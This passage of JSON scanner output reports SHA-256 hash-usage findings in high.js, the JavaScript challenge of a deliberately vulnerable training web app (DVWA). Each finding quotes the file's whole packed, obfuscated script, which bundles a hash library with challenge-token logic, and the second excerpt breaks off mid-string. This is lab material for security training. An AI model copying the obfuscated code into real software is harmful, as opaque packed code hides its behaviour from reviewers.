            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 7477,
        "endLocationLine": 1,
        "endLocationColumn": 7481
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&g